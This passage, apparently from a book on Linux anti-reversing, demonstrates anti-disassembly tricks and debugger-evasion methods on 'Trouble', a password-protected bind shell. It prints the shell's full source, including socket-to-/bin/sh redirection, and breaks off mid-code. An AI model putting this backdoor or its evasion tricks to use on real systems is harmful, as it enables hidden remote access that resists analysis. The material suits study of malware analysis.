extra bytes that won’t get executed, but GDB will treat as valid code. Update check_password() to look like this:\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 191\n\n Adding an invalid byte to check_password() to break GDB\n\n**char* calc_addr(char* p_addr)**\n{\n\n**return p_addr + 0x400000;**\n}\n\n**bool __attribute__((optimize(\"O1\"))) check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\n**char* label_address = 0;**\n\nasm volatile(\n\n\"jmp unaligned\\n\"\n\".short 0xe8\\n\"\n\"unaligned:\");\n\nlabel_address = calc_addr(((char*)&&return_here) - 0x400000);\n\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n\".string \\\"\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\\"\"\n:\n: \"g\"(label_address));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### You should notice a new asm block that adds a jump to a new label (unaligned). All the new asm block does is jump over the value “0xe8” that has been inserted into the middle of the function. However, look at it in GDB again.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 192\n\n(gdb) disas 0x400750,0x40077f\nDump of assembler code from 0x400750 to 0x40077f:\n\n0x0000000000400750 <check_password+0>: push %rbx\n0x0000000000400751 <check_password+1>: sub $0x30,%rsp\n0x0000000000400755 <check_password+5>: mov %rdi,%rbx\n0x0000000000400758 <check_password+8>: mov %fs:0x28,%rax\n0x0000000000400761 <check_password+17>: mov %rax,0x28(%rsp)\n0x0000000000400766 <check_password+22>: xor %eax,%eax\n0x0000000000400768 <check_password+24>: movb $0x0,0x20(%rsp)\n0x000000000040076d <check_password+29>: jmp 0x400771 <check_password+33>\n0x000000000040076f <check_password+31>: callq 0xffffffffc8074f74\n0x0000000000400774 <check_password+36>: mov (%rdi),%eax\n0x0000000000400776 <check_password+38>: add %al,(%rax)\n0x0000000000400778 <check_password+40>: callq 0x400740 <calc_addr>\n0x000000000040077d <check_password+45>: push %rax\n0x000000000040077e <check_password+46>: retq\nEnd of assembler dump.\n(gdb)\n\n##### As you can see, at 0x40076d a jmp to 0x400771 now exists. Right after that GDB has disassembled five bytes to be “callq 0xffffffffc8074f74”. Remember that we only inserted one byte. It appears that GDB has taken our one invalid byte and combined it with four valid bytes in order to create a new call instruction that isn’t actually there. Fortunately for the reverse engineer, x64 is made up of variable length instructions and is therefore “self-healing”. The disassembly gets back to normal at 0x40077e.\n\n Unfortunately, this trick doesn’t work on Radare2 or IDA. Here is what IDA says:\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 193\n\n check_password() witht he invalid byte\n\n.text:0000000000400750 public check_password\n.text:0000000000400750 check_password proc near ; CODE XREF: main+13D\n.text:0000000000400750\n.text:0000000000400750 var_18 = byte ptr -18h\n.text:0000000000400750 var_10 = qword ptr -10h\n.text:0000000000400750\n.text:0000000000400750 push rbx\n.text:0000000000400751 sub rsp, 30h\n.text:0000000000400755 mov rbx, rdi\n.text:0000000000400758 mov rax, fs:28h\n.text:0000000000400761 mov [rsp+38h+var_10], rax\n.text:0000000000400766 xor eax, eax\n.text:0000000000400768 mov [rsp+38h+var_18], 0\n.text:000000000040076D jmp short unaligned\n.text:000000000040076D ; ------------------------------------------------------------.text:000000000040076F db 0E8h\n.text:0000000000400770 ; ------------------------------------------------------------.text:0000000000400770\n.text:0000000000400770 unaligned: ; CODE XREF: check_password+1D\n.text:0000000000400770 mov rdi, 78Ah\n.text:0000000000400777 call calc_addr\n.text:000000000040077C push rax\n.text:000000000040077D retn\n.text:000000000040077D check_password endp ; sp-analysis failed\n\n### Jump! Jump!\n\n##### As you can see, IDA appears to realize that the byte at 0x40076f should never be executed so it skips over it entirely. What if you didn’t use an absolute jump to the unaligned label? Perhaps if we use two conditional jumps (jump zero and jump not zero) back to back then IDA would disassemble the extra byte? Again, malwinator has an excellent write up on this technique.⁵². You need to update check_password() like this:\n\n###### ⁵²https://www.malwinator.com/2015/11/22/anti-disassembly-used-in-malware-a-primer/\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 194\n\n check_password() with a double jump to obfuscate code\n\n**char* calc_addr(char* p_addr)**\n{\n\n**return p_addr + 0x400000;**\n}\n\n**bool __attribute__((optimize(\"O1\"))) check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\n**char* label_address = 0;**\n\nasm volatile(\n\n\"jz unaligned+1\\n\"\n\"jnz unaligned+1\\n\"\n\"unaligned:\\n\"\n\".byte 0xe8\\n\");\n\nlabel_address = calc_addr(((char*)&&return_here) - 0x400000);\n\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n\".string \\\"\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\\"\"\n:\n: \"g\"(label_address));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### Now if you look at how IDA handles this.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 195\n\n.text:0000000000400750 public check_password\n.text:0000000000400750 check_password: ; CODE XREF: main+13D\n.text:0000000000400750 push rbx\n.text:0000000000400751 sub rsp, 30h\n.text:0000000000400755 mov rbx, rdi\n.text:0000000000400758 mov rax, fs:28h\n.text:0000000000400761 mov [rsp+28h], rax\n.text:0000000000400766 xor eax, eax\n.text:0000000000400768 mov byte ptr [rsp+20h], 0\n.text:000000000040076D jz short near ptr unaligned+1\n.text:000000000040076F jnz short near ptr unaligned+1\n.text:0000000000400771\n.text:0000000000400771 unaligned: ; CODE XREF: .text:000000000040076D\n.text:0000000000400771 ; .text:000000000040076F\n.text:0000000000400771 call near ptr 0FFFFFFFF8D07CEBEh\n.text:0000000000400771 ; ----------------------------------------------------------.text:0000000000400776 dw 7\n.text:0000000000400778 dq 0C350FFFFFFC2E800h, 7978777675747372h, 1F2444C6007F7E7Ah\n.text:0000000000400778 dq 44C6F31E2444C6F9h, 931C2444C6C01D24h, 2444C6FD1B2444C6h\n.text:0000000000400778 dq 0C6CF192444C69A1Ah, 172444C6C3182444h, 44C6DD162444C6CBh\n.text:0000000000400778 dq 0D9142444C6EB1524h, 2444C6DC132444C6h, 0C6D2112444C6FC12h\n.text:0000000000400778 dq 0F2444C6C7102444h, 44C6CF0E2444C6C8h, 0DB0C2444C6FC0D24h\n.text:0000000000400778 dq 2444C6DA0B2444C6h, 0C6D0092444C6C80Ah, 72444C6FD082444h\n.text:0000000000400778 dq 44C6FE062444C693h, 0C5042444C6C40524h, 2444C6C7032444C6h\n.text:0000000000400778 dq 0C6CF012444C6C902h, 0FFFFFFAABAE32404h, 0E7894800000020BEh\n.text:0000000000400778 dq 20BAFFFFFBD3E8h, 0C78948DE89480000h, 0FC08500000693E8h\n.text:0000000000400778 dq 6428244C8B48C095h, 28250C3348h, 6600000205E80E74h, 841F0Fh\n.text:0000000000400870 ; ----------------------------------------------------------.text:0000000000400870 add rsp, 30h\n.text:0000000000400874 pop rbx\n.text:0000000000400875 retn\n\n### Always Follow the Conditional\n\n##### That worked beautifully! Although that double jump to the same target is pretty distinctive. Let’s go deeper. This time let’s use a conditional jump that we already know the answer to. For example, if you use jz (jump if zero) and you know the jump will always be followed then you can insert a dead byte again. How do you make sure that the jz is always followed? Simply zero our rax.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 196\n\n check_password() forcing a conditional jump into an absolute jump\n\n**char* calc_addr(char* p_addr)**\n{\n\n**return p_addr + 0x400000;**\n}\n\n**bool __attribute__((optimize(\"O1\"))) check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\n**char* label_address = 0;**\n\nasm volatile(\n\n\"xor %%rax, %%rax\\n\"\n\"jz always_here + 1\\n\"\n\"always_here:\\n\"\n\".byte 0xe8\\n\"\n: :\n: \"%rax\");\n\nasm volatile(\n\n\"jz unaligned+1\\n\"\n\"jnz unaligned+1\\n\"\n\"unaligned:\\n\"\n\".byte 0xe8\\n\");\n\nlabel_address = calc_addr(((char*)&&return_here) - 0x400000);\n\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n\".string \\\"\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\\"\"\n:\n: \"g\"(label_address));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### You can see that I’ve added a new asm block that clears rax and jumps to “always_\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 197\n\n##### here + 1”. The result in IDA looks like this:\n\n###### Absolute conditional jump in check_password()\n\n.text:0000000000400750 public check_password\n.text:0000000000400750 check_password: ; CODE XREF: main+13D\n.text:0000000000400750 push rbx\n.text:0000000000400751 sub rsp, 30h\n.text:0000000000400755 mov rbx, rdi\n.text:0000000000400758 mov rax, fs:28h\n.text:0000000000400761 mov [rsp+28h], rax\n.text:0000000000400766 xor eax, eax\n.text:0000000000400768 mov byte ptr [rsp+20h], 0\n.text:000000000040076D xor rax, rax\n.text:0000000000400770 jz short near ptr always_here+1\n.text:0000000000400772\n.text:0000000000400772 always_here: ; CODE XREF: .text:0000000000400770\n.text:0000000000400772 call near ptr 1B50AEBh\n.text:0000000000400777\n.text:0000000000400777 unaligned:\n.text:0000000000400777 call near ptr 0FFFFFFFF9307CEC4h\n.text:0000000000400777 ; ----------------------------------------------------------.text:000000000040077C dd 0E8000007h\n.text:0000000000400780 ; ----------------------------------------------------------.text:0000000000400780 mov esp, 50FFFFFFh\n.text:0000000000400785 retn\n.text:0000000000400785 ; ----------------------------------------------------------.text:0000000000400786 dw 7372h\n.text:0000000000400788 dq 7E7A797877767574h, 0C6C41F2444C6007Fh, 1D2444C6E01E2444h\n.text:0000000000400788 dq 44C69C1C2444C692h, 0D81A2444C6F31B24h, 2444C6DC192444C6h\n.text:0000000000400788 dq 0C6F8172444C6DA18h, 152444C6D2162444h, 44C6F8142444C6ECh\n.text:0000000000400788 dq 0D8122444C6D01324h, 2444C69A112444C6h, 0C6DC0F2444C6ED10h\n.text:0000000000400788 dq 0D2444C69F0E2444h, 44C6FB0C2444C6C3h, 0D90A2444C6980B24h\n.text:0000000000400788 dq 2444C6C1092444C6h, 0C6ED072444C6D808h, 52444C6E9062444h\n.text:0000000000400788 dq 44C6F0042444C693h, 0F8022444C6FE0324h, 2404C6DE012444C6h\n.text:0000000000400788 dq 20BEFFFFFFAABAC3h, 0CDE8E78948000000h, 20BAFFFFFBh\n.text:0000000000400788 dq 8DE8C78948DE8948h, 0C0950FC085000006h, 33486428244C8B48h\n.text:0000000000400788 dq 87400000028250Ch, 1F0F000001FFE8h\n.text:0000000000400870 ; ----------------------------------------------------------.text:0000000000400870 add rsp, 30h\n.text:0000000000400874 pop rbx\n.text:0000000000400875 retn\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 198\n\n##### Radare2 does even worse.\n\n###### Radare2’s handling of the absolute conditional jump\n\n[0x0040030c]> pdf @ sym.check_password\n/ (fcn) sym.check_password 43\n| sym.check_password ();\n| ; var int local_20h @ rsp+0x20\n| ; var int local_28h @ rsp+0x28\n| ; CALL XREF from 0x0040026d (unk)\n| 0x00400750 53 push rbx\n| 0x00400751 4883ec30 sub rsp, 0x30 ; '0'\n| 0x00400755 4889fb mov rbx, rdi\n| 0x00400758 64488b042528. mov rax, qword fs:[0x28]\n| 0x00400761 4889442428 mov qword [rsp + local_28h], rax\n| 0x00400766 31c0 xor eax, eax\n| 0x00400768 c644242000 mov byte [rsp + local_20h], 0\n| 0x0040076d 4831c0 xor rax, rax\n|,=< 0x00400770 7401 je 0x400773\n| | ;-- always_here:\n\\ | 0x00400772 e874037501 call 0x1b50aeb\n;-- unaligned:\n0x00400777 e8 invalid\n0x00400778 48 invalid\n0x00400779 c7 invalid\n0x0040077a c7 invalid\n\n[0x0040030c]> quit\n\n### Overlapping Instructions\n\n##### In the previous examples, you inserted a byte that would never be executed by the program. While this technique successfully obfuscated check_password(), a clever disassembler might be able to identify the unused byte and display the correct disassembly. However, there is a techique that even a clever disassembler would struggle with: overlapping instructions. If you can write code that is executed twice but represents two different instructions then you have introduced a real problem to both the disassembler and the reverse engineer.\n\n The most well known example of this technique, that I know of, can be found in\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 199\n\n##### the book “Practical Malware Analysis” by Michael Sikorski and Andrew Honig⁵³. The following updated version of check_password() is very similar to the version explained in “Practical Malware Analysis” except you’ll be writing in x64 and, as always, you’ll actually be able to compile it.\n\n###### Overlapping instructions in check_password()\n\n**char* calc_addr(char* p_addr)**\n{\n\n**return p_addr + 0x400000;**\n}\n\n**bool __attribute__((optimize(\"O1\"))) check_password(const char* p_password)**\n{\n\n**char pass[password_size] = {};**\n**char* label_address = 0;**\n\nasm volatile(\n\n\"mov_ins:\\n\"\n\"mov $2283, %%rax\\n\"\n\"xor %%rax, %%rax\\n\"\n\"jz mov_ins+3\\n\"\n\".byte 0xe8\\n\"\n: :\n: \"%rax\");\n\nasm volatile(\n\n\"xor %%rax, %%rax\\n\"\n\"jz always_here + 1\\n\"\n\"always_here:\\n\"\n\".byte 0xe8\\n\"\n: :\n: \"%rax\");\n\nasm volatile(\n\n\"jz unaligned+1\\n\"\n\"jnz unaligned+1\\n\"\n\"unaligned:\\n\"\n\".byte 0xe8\\n\");\n\nlabel_address = calc_addr(((char*)&&return_here) - 0x400000);\n\n###### ⁵³https://www.nostarch.com/malware\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 200\n\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n\".string \\\"\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\\"\"\n:\n: \"g\"(label_address));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n##### The new code in question is the first block of asm.\n\n###### Overlapping code block\n\nasm volatile(\n\n\"mov_ins:\\n\"\n\"mov $2283, %%rax\\n\"\n\"xor %%rax, %%rax\\n\"\n\"jz mov_ins+3\\n\"\n\".byte 0xe8\\n\"\n: :\n: \"%rax\");\n\n##### It probably isn’t exactly clear what is going on here, so let’s look at the disassembly.\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 201\n\n Overlapping instructions in IDA\n\n.text:000000000040076D mov_ins: ; CODE XREF: .text:0000000000400777\n.text:000000000040076D 48 C7 C0 EB 08 00 00 mov rax, 8EBh\n.text:0000000000400774 48 31 C0 xor rax, rax\n.text:0000000000400777 74 F7 jz short near ptr mov_ins+3\n.text:0000000000400779 E8 48 31 C0 74 call near ptr 750038C6h\n.text:0000000000400779 ; ---------------------------------.text:000000000040077E 01 db 1\n\n##### Starting at the mov_ins label this code block:\n\n 1. Moves 0xe8b into rax 2. Clears rax 3. Jump to the mov_ins label plus three\n\n Step three is the interesting part because mov_ins+3 is right in the middle of the original mov instruction. Is there an instruction at mov_ins+3? To test if that is the case undefine the code where mov_ins starts and mark mov_ins+3 as code. IDA should now look like this:\n\n###### Discovering the valid code at mov_ins+3\n\n.text:000000000040076D 48 mov_ins db 48h ; H\n.text:000000000040076E C7 db 0C7h ; ¦\n.text:000000000040076F C0 db 0C0h ; +\n.text:0000000000400770 ; ---------------------------------.text:0000000000400770 EB 08 jmp short loc_40077A\n.text:0000000000400770 ; ---------------------------------.text:0000000000400772 00 db 0\n.text:0000000000400773 00 db 0\n.text:0000000000400774 48 db 48h ; H\n.text:0000000000400775 31 db 31h ; 1\n.text:0000000000400776 C0 db 0C0h ; +\n.text:0000000000400777 74 db 74h ; t\n.text:0000000000400778 F7 db 0F7h ; ˜\n.text:0000000000400779 E8 db 0E8h ; F\n.text:000000000040077A ; ---------------------------------.text:000000000040077A\n\n\n-----\n\n###### Chapter 5: Obstructing Code Flow Analysis 202\n\n.text:000000000040077A loc_40077A: ; CODE XREF: .text:0000000000400770\n.text:000000000040077A 48 31 C0 xor rax, rax\n.text:000000000040077D 74 01 jz short near ptr always_here+1\n\n##### You can see there is a valid jump at mov_ins+3. The jump skips over the remaining code that you defined in the asm block down to the next bit of legitimate code. That’s it! We reuse bytes in the mov instruction to hide the real jump to the code that follows the asm block.\n\n\n-----\n\n# Chapter 6: Evading the Debugger\n\n##### For this chapter you’ll use the version of the Trouble bind shell found in the “chap_- 6_debugger” directory. This version of the bind shell uses many of the obfuscation techniques that you’ve previously learned in the book.\n\n### Trace Me\n\n##### Before you can catch debuggers like GDB you need to know how they work. Essential to the operation of a debugger is the ptrace system call⁵⁴. The man page says:\n\n The ptrace() system call provides a means by which one process (the “tracer”) may observe and control the execution of another process (the “tracee”), and examine and change the tracee’s memory and registers. It is primarily used to implement breakpoint debugging and system call tracing\n\n One noteable aspect of ptrace is that only one tracer can control a tracee at a time. This means if GDB is tracing Trouble then no other process can trace Trouble. This is useful from an anti debugging point of view because you are able to determine if a debugger is attached to Trouble simply by calling ptrace(). To try this out, update Trouble’s main() to detect tracing. Note that the following code will require “#include <sys/ptrace.h>” to be added as well.\n\n###### ⁵⁴man ptrace\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 204\n\n Detect a debugger via ptrace()\n\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n**if (ptrace(PTRACE_TRACEME, 0, NULL, NULL) != 0)**\n{\nfprintf(stderr, \"Tracer detected!\\n\");\nexit(EXIT_FAILURE);\n}\n\n##### If you recompile Trouble with the ptrace() code and execute Trouble with GDB then you’ll find that Trouble terminates early. Note the line “Tracer detected!” below.\n\n###### Trouble exits early after failing to set the tracer\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ gdb ./trouble/tr\\\nouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble/trouble...(no debugging symbols found)...done.\n(gdb) start\nTemporary breakpoint 1 at 0x400130\nStarting program: /home/albino-lobster/antire_book/chap_6_debugger/dontpanic/build/tr\\\nouble/trouble\nTracer detected!\n\n[Inferior 1 (process 59897) exited with code 01]\n(gdb)\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 205\n\n##### However, if you execute Trouble without GDB then it executes without issue. What’s the deal? The new code you added makes a call to ptrace using PTRACE_TRACEME. If Trouble wasn’t started with GDB then this PTRACE_TRACEME call sets the parent program as tracing program. In this case, the parent program is /bin/bash. To confirm this, run Trouble and check it’s /proc/<pid>/status file. Here is an example of what you should see.\n\n###### Observing the tracer pid in /proc/pidof trouble/status\n\nalbino-lobster@ubuntu:~$ cat /proc/`pidof trouble`/status\nName: trouble\nState: S (sleeping)\nTgid: 59935\nNgid: 0\nPid: 59935\nPPid: 2402\nTracerPid: 2402\n\n##### The two most important lines in the above are “PPid” (parent pid) and “TracerPid”. Both of these show the value of 2402. You can confirm that is bash by using the ps command.\n\n###### Finding pid 2402 in ps\n\nalbino-lobster@ubuntu:~$ ps f\nPID TTY STAT TIME COMMAND\n2835 pts/17 Ss 0:00 bash\n59953 pts/17 R+ 0:00 **\\_ ps f**\n2402 pts/1 Ss 0:01 bash\n59935 pts/1 S+ 0:00 **\\_ ./trouble/trouble**\n\n##### If Trouble was executed via GDB then the PTRACE_TRACEME call you added will fail and Trouble will exit. This is because Trouble is already being traced by GDB so it can’t set the parent process as the tracer. Remember there can only be one tracer at a time. In this way we prevent ptrace based debuggers from attaching to Trouble.\n\n As another example, consider the gcore utility. gcore is a tool that produces core dumps of running programs. This is particularly useful if a program is using a cryptor, like Trouble does, since the core dump will capture the unencrypted version of the program which can then be loaded into IDA or another disassembler. However, if we use the PTRACE_TRACEME logic then gcore will fail.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 206\n\n gcore can’t create a core due to another process already tracing Trouble\n\nalbino-lobster@ubuntu:~$ sudo gcore `pidof trouble`\nCould not attach to process. If your uid matches the uid of the target\nprocess, check the setting of /proc/sys/kernel/yama/ptrace_scope, or try\nagain as the root user. For more details, see /etc/sysctl.d/10-ptrace.conf\nwarning: process 60023 is already traced by process 2402\nptrace: Operation not permitted.\nYou can't do that without a process to debug.\nThe program is not being run.\ngcore: failed to create core.60023\n\n##### Notice that gcore complains that Trouble is already being traced by process 2402?\n\n A final example is the strace utility. strace lists all of the system calls that a program makes. However, due to its use of ptrace Trouble is able to detect it.\n\n###### Detecting strace using PTRACE_TRACEME\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ strace ./trouble\\\n/trouble\nexecve(\"./trouble/trouble\", [\"./trouble/trouble\"], [/* 64 vars */]) = 0\narch_prctl(ARCH_SET_FS, 0x604240) = 0\nset_tid_address(0x604278) = 61493\nptrace(PTRACE_TRACEME, 0, NULL, NULL) = -1 EPERM (Operation not permitted)\nwritev(2, [{\"\", 0}, {\"Tracer detected!\\n\", 17}], 2Tracer detected!\n) = 17\nexit_group(1) = ?\n+++ exited with 1 +++\n\n##### One thing to be concerned about with the PTRACE_TRACEME approach is that you are giving an unknown program, bash in this case, full control over your program. Who knows if bash can be trusted to trace Trouble?\n\n### Trapping the Debugger\n\n##### There is different but simple way to detect a debugger without having to rely on ptrace(). The following code is an updated version of Trouble that uses the SIGTRAP signal.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 207\n\n Catching the debugger using SIGTRAP\n\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdbool.h>\n#include <sys/mman.h>\n#include <signal.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <sys/ptrace.h>\n\n#include \"rc4.h\"\n#include \"xor_string.h\"\n\n**extern void* check_password_size;**\n**unsigned char check_password_key[128] __attribute((section(\".rc4_check_password\"))) =\\**\n{ 0 };\n\n**char* calc_addr(char* p_addr)**\n{\n\n**return p_addr + 0x400000;**\n}\n\n**bool __attribute__((optimize(\"O1\"), section(\".check_password\")))**\ncheck_password(const char* p_password)\n{\n\n**char pass[password_size] = {};**\n**char* label_address = 0;**\n\nasm volatile(\n\n\"mov_ins:\\n\"\n\"mov $2283, %%rax\\n\"\n\"xor %%rax, %%rax\\n\"\n\"jz mov_ins+3\\n\"\n\".byte 0xe8\\n\"\n: :\n: \"%rax\");\n\nasm volatile(\n\n\"xor %%rax, %%rax\\n\"\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 208\n\n\"jz always_here + 1\\n\"\n\"always_here:\\n\"\n\".byte 0xe8\\n\"\n: :\n: \"%rax\");\n\nasm volatile(\n\n\"jz unaligned+1\\n\"\n\"jnz unaligned+1\\n\"\n\"unaligned:\\n\"\n\".byte 0xe8\\n\");\n\nlabel_address = calc_addr(((char*)&&return_here) - 0x400000);\n\nasm volatile(\n\n\"push %0\\n\"\n\"ret\\n\"\n\".string \\\"\\x72\\x73\\x74\\x75\\x76\\x77\\x78\\x79\\x7a\\x7b\\x7c\\x7d\\x7e\\x7f\\\"\"\n:\n: \"g\"(label_address));\n\nreturn_here:\nXOR_STRING31(pass, password, 0xaa);\n\n// validate the password\n**return memcmp(undo_xor_string(pass, 32, 0xaa), p_password, 32) != 0;**\n}\n\n**void trap_handler()**\n{\n\n**int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);**\n**if (sock == -1)**\n{\nfprintf(stderr, \"Failed to create the socket.\");\nexit(EXIT_FAILURE);\n}\n\n**struct sockaddr_in bind_addr = {};**\nbind_addr.sin_family = AF_INET;\nbind_addr.sin_addr.s_addr = htonl(INADDR_ANY);\nbind_addr.sin_port = htons(1270);\n\n**int bind_result = bind(sock, (struct sockaddr*) &bind_addr,**\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 209\n\n**sizeof(bind_addr));**\n**if (bind_result != 0)**\n{\nperror(\"Bind call failed\");\nexit(EXIT_FAILURE);\n}\n\n**int listen_result = listen(sock, 5);**\n**if (listen_result != 0)**\n{\nperror(\"Listen call failed\");\nexit(EXIT_FAILURE);\n}\n\n**while (true)**\n{\n\n**int client_sock = accept(sock, NULL, NULL);**\n**if (client_sock < 0)**\n{\nperror(\"Accept call failed\");\nexit(EXIT_FAILURE);\n}\n\n**int child_pid = fork();**\n**if (child_pid == 0)**\n{\n\n// read in the password\n**char password_input[password_size] = { 0 };**\n**int read_result = read(client_sock, password_input, password_size - 1);**\n**if (read_result < (int)(password_size - 1))**\n{\nclose(client_sock);\nexit(EXIT_FAILURE);\n}\n\n// decrypt valid target\n**struct rc4_state state = {};**\nmprotect(check_password, (uint64_t)&check_password_size, PROT_READ | PROT\\\n_WRITE | PROT_EXEC);\nrc4_init(&state, check_password_key, sizeof(check_password_key));\nrc4_crypt(&state, (unsigned char*)check_password, (unsigned char*)check_p\\\nassword,\n(uint64_t)&check_password_size);\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 210\n\nmprotect(check_password, (uint64_t)&check_password_size, PROT_READ | PROT\\\n_EXEC);\n\n**if (check_password(password_input))**\n{\nclose(client_sock);\nexit(EXIT_FAILURE);\n}\n\ndup2(client_sock, 0);\ndup2(client_sock, 1);\ndup2(client_sock, 2);\n\n**char* empty[] = { NULL };**\n**char binsh[] = { '/', 'b', 'i', 'n', '/', 's', 'h', 0 };**\nexecve(binsh, empty, empty);\nclose(client_sock);\nexit(EXIT_SUCCESS);\n}\n\nclose(client_sock);\n}\nexit(EXIT_SUCCESS);\n}\n\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n// register the trap handler function to handle SIGTRAP\n**struct sigaction sVal = { };**\nsVal.sa_flags = SA_SIGINFO;\nsVal.sa_sigaction = trap_handler;\nsigaction(SIGTRAP, &sVal, NULL);\n\n// generate a sigtrap\nkill(getpid(), SIGTRAP);\n\n**return EXIT_SUCCESS;**\n}\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 211\n\n##### If you run this version of Trouble via GDB then it will exit without ever calling trap_handler().\n\n###### Trouble exiting early after SIGTRAP\n\nalbino-lobster@ubuntu:~/antire_book/chap_6_debugger/dontpanic/build$ gdb ./trouble/tr\\\nouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble/trouble...(no debugging symbols found)...done.\n(gdb) start\nTemporary breakpoint 1 at 0x4005b1\nStarting program: /home/albino-lobster/antire_book/chap_6_debugger/dontpanic/build/tr\\\nouble/trouble\n\nTemporary breakpoint 1, 0x00000000004005b1 in main ()\n(gdb) c\nContinuing.\n\nProgram received signal SIGTRAP, Trace/breakpoint trap.\n0x0000000000400cd9 in kill ()\n(gdb) c\nContinuing.\n\n[Inferior 1 (process 84663) exited normally]\n(gdb)\n\n##### As you can see from the above, GDB receives the SIGTRAP but doesn’t pass it on to Trouble so that trap_handler() gets executed.\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 212\n\n##### There is a problem with this technique though. If the debugger attaches to Trouble after the SIGTRAP has been generated then it won’t be detected. In the following example, gcore has no problem generating a core from Trouble.\n\n###### Bypassing the SIGTRAP technique with gcore\n\nalbino-lobster@ubuntu:~$ sudo gcore `pidof trouble`\n\n[sudo] password for albino-lobster:\n0x0000000000401448 in __syscall ()\nSaved corefile core.84691\n\n##### gcore is able to attach to Trouble and create the core file. Unfortunately, there is little our SIGTRAP method can do to stop this. Even if you generate more SIGTRAP signals, this method simply doesn’t prevent other processes from attaching.\n\n### Becoming Attached\n\n##### Another well known method uses PTRACE_ATTACH from a forked child. Consider the following changes to Trouble:\n\n###### Trouble updated to trace itself\n\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n**int fork_pid = fork();**\n**if (fork_pid == 0)**\n{\n\n// trace the parent process\n**if (ptrace(PTRACE_ATTACH, getppid(), NULL, NULL) != 0)**\n{\nexit(EXIT_FAILURE);\n}\n\nptrace(PTRACE_SETOPTIONS, getppid(), NULL, PTRACE_O_TRACEFORK);\n\n// restart the parent so it can keep processing like normal\n\n\n-----\n\n###### Chapter 6: Evading the Debugger 213\n\n**int status = 0;**\nwait(&status);\nptrace(PTRACE_CONT, getppid(), NULL, NULL);\n\n// handle any signals that may come in from tracees\n**while (true)**\n{\n\n**int pid 